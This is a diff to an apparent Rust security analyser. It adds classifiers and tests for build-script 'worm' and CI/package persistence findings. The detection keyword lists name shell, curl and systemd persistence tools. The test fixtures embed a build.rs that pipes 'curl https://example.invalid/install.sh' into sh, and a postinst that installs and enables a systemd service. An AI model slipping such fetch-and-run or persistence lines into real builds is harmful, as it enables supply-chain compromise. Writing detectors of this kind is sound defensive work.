@@ -1681,6 +1681,201 @@ pub fn classify_unverified_provenance_proof(
     }
 }
 
+/// Returns `true` when a production package build lifecycle executes a
+/// dependency-controlled payload without sandbox, provenance, or allowlist.
+pub fn cargo_build_worm_is_reachable(
+    has_build_lifecycle: bool,
+    has_dangerous_payload: bool,
+    has_build_guard: bool,
+    in_nonproduction_path: bool,
+) -> bool {
+    has_build_lifecycle && has_dangerous_payload && !has_build_guard && !in_nonproduction_path
+}
+
+/// Classifies a `security:cargo_build_worm` finding into a `ProofClass`.
+///
+/// - Tests/docs/examples/generated/local scripts -> `InvariantViolationProof`
+/// - OUT_DIR sandbox/provenance/allowlist/lockfile guards -> `InvariantViolationProof`
+/// - Production build/install lifecycle with unsafe payload -> `ReachabilityProof`
+/// - Otherwise -> `LatticeGapProposal`
+pub fn classify_cargo_build_worm_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
+    let path_lower = finding
+        .file
+        .as_deref()
+        .unwrap_or_default()
+        .replace('\\', "/")
+        .to_ascii_lowercase();
+    let in_nonproduction_path = path_lower.contains("test")
+        || path_lower.contains("fixture")
+        || path_lower.contains("mock")
+        || path_lower.contains("spec")
+        || path_lower.contains("generated")
+        || path_lower.contains("examples/")
+        || path_lower.contains("/docs/")
+        || path_lower.contains("/sample")
+        || path_lower.contains("/samples/")
+        || path_lower.contains("/local/")
+        || path_lower.contains("/devcontainer/")
+        || path_lower.ends_with(".md");
+    if in_nonproduction_path {
+        return ProofClass::InvariantViolationProof;
+    }
+
+    let source_lower = source.to_ascii_lowercase();
+    let has_build_lifecycle = path_lower.ends_with("build.rs")
+        || path_lower.ends_with("package.json")
+        || path_lower.ends_with("setup.py")
+        || source_lower.contains("cargo:rerun-if")
+        || source_lower.contains("\"preinstall\"")
+        || source_lower.contains("\"postinstall\"")
+        || source_lower.contains("build-script")
+        || source_lower.contains("build_script");
+    let has_dangerous_payload = source_lower.contains("std::process::command")
+        || source_lower.contains("command::new")
+        || source_lower.contains(".arg(\"-c\")")
+        || source_lower.contains(".arg(\"/c\")")
+        || source_lower.contains("curl ")
+        || source_lower.contains("wget ")
+        || source_lower.contains("reqwest::")
+        || source_lower.contains("ureq::")
+        || source_lower.contains("git clone")
+        || source_lower.contains("fs::write")
+        || source_lower.contains("std::fs::write")
+        || source_lower.contains("file::create")
+        || source_lower.contains("openoptions::new");
+    let has_build_guard = source_lower.contains("out_dir")
+        || source_lower.contains("env::var(\"out_dir\")")
+        || source_lower.contains("sha256")
+        || source_lower.contains("sha384")
+        || source_lower.contains("sha512")
+        || source_lower.contains("checksum")
+        || source_lower.contains("cosign")
+        || source_lower.contains("sigstore")
+        || source_lower.contains("gpg --verify")
+        || source_lower.contains("allowlist")
+        || source_lower.contains("allowed_commands")
+        || source_lower.contains("locked = true")
+        || source_lower.contains("cargo.lock");
+    if has_build_guard {
+        return ProofClass::InvariantViolationProof;
+    }
+
+    if cargo_build_worm_is_reachable(
+        has_build_lifecycle,
+        has_dangerous_payload,
+        has_build_guard,
+        in_nonproduction_path,
+    ) {
+        ProofClass::ReachabilityProof
+    } else {
+        ProofClass::LatticeGapProposal
+    }
+}
+
+/// Returns `true` when a production CI or package lifecycle can persist code
+/// through a startup hook without attestation or allowlist.
+pub fn ci_persistence_vector_is_reachable(
+    has_persistence_sink: bool,
+    has_ci_or_package_lifecycle: bool,
+    has_attestation_or_allowlist: bool,
+    in_nonproduction_path: bool,
+) -> bool {
+    has_persistence_sink
+        && has_ci_or_package_lifecycle
+        && !has_attestation_or_allowlist
+        && !in_nonproduction_path
+}
+
+/// Classifies a `security:ci_persistence_vector` finding into a `ProofClass`.
+///
+/// - Tests/docs/examples/local admin installers -> `InvariantViolationProof`
+/// - Attestation or strict allowlist -> `InvariantViolationProof`
+/// - Production CI/package lifecycle persistence without guard -> `ReachabilityProof`
+/// - Otherwise -> `LatticeGapProposal`
+pub fn classify_ci_persistence_vector_proof(
+    source: &str,
+    finding: &StructuredFinding,
+) -> ProofClass {
+    let path_lower = finding
+        .file
+        .as_deref()
+        .unwrap_or_default()
+        .replace('\\', "/")
+        .to_ascii_lowercase();
+    let in_nonproduction_path = path_lower.contains("test")
+        || path_lower.contains("fixture")
+        || path_lower.contains("mock")
+        || path_lower.contains("spec")
+        || path_lower.contains("generated")
+        || path_lower.contains("examples/")
+        || path_lower.contains("/docs/")
+        || path_lower.contains("/sample")
+        || path_lower.contains("/samples/")
+        || path_lower.contains("/local/")
+        || path_lower.contains("/devcontainer/")
+        || path_lower.ends_with(".md");
+    if in_nonproduction_path {
+        return ProofClass::InvariantViolationProof;
+    }
+
+    let source_lower = source.to_ascii_lowercase();
+    let has_persistence_sink = source_lower.contains("systemctl enable")
+        || source_lower.contains("systemctl start")
+        || source_lower.contains("/etc/systemd/system")
+        || source_lower.contains("init.d/")
+        || source_lower.contains("rc.local")
+        || source_lower.contains("crontab -")
+        || source_lower.contains("cron.d")
+        || source_lower.contains(".bashrc")
+        || source_lower.contains("/etc/environment")
+        || source_lower.contains("launchctl")
+        || source_lower.contains("launchagents")
+        || source_lower.contains(".github/workflows/");
+    let has_ci_or_package_lifecycle = path_lower.contains(".github/workflows/")
+        || path_lower.contains("postinst")
+        || path_lower.contains("postinstall")
+        || path_lower.contains("preinstall")
+        || path_lower.contains("packaging/")
+        || path_lower.contains("debian/")
+        || path_lower.contains("rpm/")
+        || path_lower.ends_with("package.json")
+        || source_lower.contains("github_token")
+        || source_lower.contains("github.event")
+        || source_lower.contains("pull_request_target")
+        || source_lower.contains("workflow_dispatch")
+        || source_lower.contains("postinst")
+        || source_lower.contains("postinstall")
+        || source_lower.contains("preinstall")
+        || source_lower.contains("dpkg")
+        || source_lower.contains("npm_config");
+    let has_attestation_or_allowlist = source_lower.contains("sha256")
+        || source_lower.contains("sha384")
+        || source_lower.contains("sha512")
+        || source_lower.contains("checksum")
+        || source_lower.contains("cosign")
+        || source_lower.contains("sigstore")
+        || source_lower.contains("gpg --verify")
+        || source_lower.contains("in-toto")
+        || source_lower.contains("allowlist")
+        || source_lower.contains("allowed_services")
+        || source_lower.contains("trusted_service")
+        || source_lower.contains("signed artifact");
+    if has_attestation_or_allowlist {
+        return ProofClass::InvariantViolationProof;
+    }
+
+    if ci_persistence_vector_is_reachable(
+        has_persistence_sink,
+        has_ci_or_package_lifecycle,
+        has_attestation_or_allowlist,
+        in_nonproduction_path,
+    ) {
+        ProofClass::ReachabilityProof
+    } else {
+        ProofClass::LatticeGapProposal
+    }
+}
+
 fn append_gap_proposals_to(path: &Path, proposals: &[String]) -> std::io::Result<()> {
     let mut content = fs::read_to_string(path).unwrap_or_default();
     let mut changed = false;
@@ -2796,6 +2991,91 @@ mod tests {
         let source = "[dependencies]\nplugin = { git = \"https://github.com/acme/plugin\" }";
         assert_eq!(
             super::classify_unverified_provenance_proof(source, &finding),
+            ProofClass::ReachabilityProof
+        );
+    }
+
+    #[test]
+    fn cargo_build_worm_example_path_yields_invariant_violation() {
+        let finding = StructuredFinding {
+            id: "security:cargo_build_worm".to_string(),
+            file: Some("examples/native/build.rs".to_string()),
+            ..Default::default()
+        };
+        let source = r#"fn main() { std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid/x | sh").status().unwrap(); }"#;
+        assert_eq!(
+            super::classify_cargo_build_worm_proof(source, &finding),
+            ProofClass::InvariantViolationProof
+        );
+    }
+
+    #[test]
+    fn cargo_build_worm_out_dir_guard_yields_invariant_violation() {
+        let finding = StructuredFinding {
+            id: "security:cargo_build_worm".to_string(),
+            file: Some("crates/native/build.rs".to_string()),
+            ..Default::default()
+        };
+        let source = r#"fn main() { let out = std::env::var("OUT_DIR").unwrap(); std::fs::write(format!("{out}/bindings.rs"), "ok").unwrap(); }"#;
+        assert_eq!(
+            super::classify_cargo_build_worm_proof(source, &finding),
+            ProofClass::InvariantViolationProof
+        );
+    }
+
+    #[test]
+    fn cargo_build_worm_remote_shell_yields_reachability() {
+        let finding = StructuredFinding {
+            id: "security:cargo_build_worm".to_string(),
+            file: Some("crates/native/build.rs".to_string()),
+            ..Default::default()
+        };
+        let source = r#"fn main() { std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid/install.sh | sh").status().unwrap(); }"#;
+        assert_eq!(
+            super::classify_cargo_build_worm_proof(source, &finding),
+            ProofClass::ReachabilityProof
+        );
+    }
+
+    #[test]
+    fn ci_persistence_docs_path_yields_invariant_violation() {
+        let finding = StructuredFinding {
+            id: "security:ci_persistence_vector".to_string(),
+            file: Some("docs/examples/postinst".to_string()),
+            ..Default::default()
+        };
+        let source = "systemctl enable janitor-agent.service";
+        assert_eq!(
+            super::classify_ci_persistence_vector_proof(source, &finding),
+            ProofClass::InvariantViolationProof
+        );
+    }
+
+    #[test]
+    fn ci_persistence_attestation_guard_yields_invariant_violation() {
+        let finding = StructuredFinding {
+            id: "security:ci_persistence_vector".to_string(),
+            file: Some("packaging/deb/control/postinst".to_string()),
+            ..Default::default()
+        };
+        let source = "sha256sum -c agent.sha256 && systemctl enable janitor-agent.service";
+        assert_eq!(
+            super::classify_ci_persistence_vector_proof(source, &finding),
+            ProofClass::InvariantViolationProof
+        );
+    }
+
+    #[test]
+    fn ci_persistence_postinst_systemd_yields_reachability() {
+        let finding = StructuredFinding {
+            id: "security:ci_persistence_vector".to_string(),
+            file: Some("packaging/deb/control/postinst".to_string()),
+            ..Default::default()
+        };
+        let source =
+            "cp agent.service /etc/systemd/system/agent.service\nsystemctl enable agent.service";
+        assert_eq!(
+            super::classify_ci_persistence_vector_proof(source, &finding),
             ProofClass::ReachabilityProof
         );
     }
